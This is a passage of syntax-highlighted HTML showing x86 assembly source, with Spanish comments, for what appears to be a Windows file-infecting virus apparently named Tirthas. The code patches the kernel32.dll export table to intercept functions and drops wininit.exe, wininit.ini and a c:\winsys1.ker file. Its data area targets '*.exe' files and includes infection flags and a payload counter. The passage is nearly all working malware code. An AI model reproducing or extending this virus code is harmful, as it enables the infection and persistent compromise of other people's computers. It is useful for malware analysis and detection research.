 </span><span class="sc5">Search_E_data</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ade.'</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">E_data_header</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Search_E_data</span><span class="sc0">

 </span><span class="sc5">E_data_header</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer_to_raw_data_export</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CALCULAR LA CONSTANTE DE SECCION</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;Virtual address</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Constante_seccion</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; MODIFICAR LA SECCION DE EXPORTACIONES</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calc_RVA</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer_to_raw_data_export</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;EAX = Edata</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Constante_seccion</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;EAX = Address of fuction</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ordinal_funcion_1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Ordinal</span><span class="sc0">
      </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                   </span><span class="sc1">;Direccion de la RVA...</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Datos_0</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">;Cambiamos el offset</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CIERRE DEL KERNEL</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close_mapping</span><span class="sc0">

 </span><span class="sc5">New_Wininit</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CREAR WININIT.EXE</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7BFh</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Windows_path</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">Create_wininit</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_Wininit</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CreateFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Generalt_exit</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_wininit</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Bytes_wininit</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Wininit_size</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_wininit_start</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_WriteFile</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_wininit</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CloseHandle</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CREAR WINSYSTEM.KER</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_System_addr</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CreateFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Generalt_exit</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_winsystem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Bytes_wininit</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">System_path</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_WriteFile</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_winsystem</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CloseHandle</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CREAR WININIT.INI</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_Wininit_ini</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CreateFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Generalt_exit</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CloseHandle</span><span class="sc4">]</span><span class="sc0">


      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; SALIDA</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Generalt_exit</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">First_exit</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Image_base</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Old_entry_point</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">First_exit</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_ExitProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; AREA DE DATOS</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Tirthas_size</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tirthas_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tirthas_start</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">SetCurrentDirectoryA_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tirthas_start</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">Wininit_size</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_wininit_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_wininit_start</span><span class="sc4">)</span><span class="sc0"> 

      </span><span class="sc5">Base_kernel</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Base_fichero</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_windows</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_find_files</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_createfile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_createfilemap</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_kernel32</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_wininit</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_winsystem</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_wininit_ini</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">New_entry_point</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Old_entry_point</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

      </span><span class="sc5">Number_section</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Size_optional_header</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Virtual_address_LS</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Virtual_size_LS</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Pointer_to_raw_data_LS</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Address_Last_section</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Section_alignment</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_alignment</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Address_export_table</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">Old_SEH</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Bytes_wininit</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">Files_exe</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Files_cho</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.cho'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Path_in_fuction</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
      </span><span class="sc5">File_Wininit</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'wininit.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_Wininit_ini</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'wininit.ini'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_System_addr</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'c:\winsys1.ker'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_USER32</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'user32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_ADVAPI32</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'advapi32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_GDI32</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'gdi32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Kernel32backup</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'kernel32.dl_'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Kernel32</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Kernel32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">System_path</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
      </span><span class="sc5">Windows_path</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

      </span><span class="sc5">Address_PEheader</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Image_base</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      
      </span><span class="sc5">Numero_payload</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Flag_numero</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;--&gt; Evita aumentar de tama쨚 si el </span><span class="sc0">
      </span><span class="sc5">Flag_funciones</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;    archivo no es apto.</span><span class="sc0">
      </span><span class="sc5">Flag_infection_by_fuction</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Flag_fuction_Find_File</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Flag_open_kernel</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; FUNCIONES INTERCEPTADAS</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">Return_address</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Return_address_in_virus</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">File_search</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Struc_search</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Handle_Find_next</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; REGISTROS</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">EAX_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">EBX_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">ECX_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">EDX_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">ESI_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">EDI_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">EBP_seg</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; REGISTRO DE WINDOWS</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">Clave_Accessibility</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Control Panel\Accessibility\HighContrast'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Nombre_clave</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Enabled'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
